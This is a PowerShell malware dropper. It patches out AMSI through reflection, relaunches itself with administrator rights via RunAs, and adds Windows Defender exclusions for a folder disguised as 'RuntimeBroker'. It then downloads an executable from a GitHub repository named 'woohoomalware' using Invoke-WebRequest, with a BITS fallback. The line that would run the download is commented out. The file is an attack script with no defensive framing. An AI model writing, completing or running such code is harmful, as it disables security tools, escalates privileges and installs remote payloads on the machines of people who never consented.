# AMSI bypass (try-catch is good)
try {
    $type = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $field = $type.GetField('amsiInitFailed','NonPublic,Static')
    $field.SetValue($null,$true)
} catch {}

# Self-elevate
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(544)) {
    $t = Join-Path $env:LOCALAPPDATA 'wsync.ps1'
    Copy-Item $PSCommandPath $t -Force -ErrorAction SilentlyContinue
    Start-Process powershell "-NoP -EP Bypass -W 1 -File `"$t`"" -Verb RunAs
    exit
}

# Config
$d = Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps\RuntimeBroker'
$n = 'RuntimeBroker.exe'
$p = Join-Path $d $n
$u = 'https://github.com/woohoomalware/WeAreDanger/raw/refs/heads/main/letsgo.exe'

# AV exclusion (direct cmdlet calls)
try {
    Add-MpPreference -ExclusionPath $d -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess $n -ErrorAction SilentlyContinue
} catch {}

# Create dir
New-Item $d -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

# Download using native PowerShell (more reliable)
try {
    Invoke-WebRequest -Uri $u -OutFile $p -TimeoutSec 30 -ErrorAction Stop
} catch {
    # Fallback to BITS
    Start-BitsTransfer -Source $u -Destination $p -Priority High -ErrorAction SilentlyContinue
}

# Check if download succeeded
if (Test-Path $p) {
    # Optionally run the downloaded file
    # Start-Process $p
} else {
    Write-Error "Download failed."
}
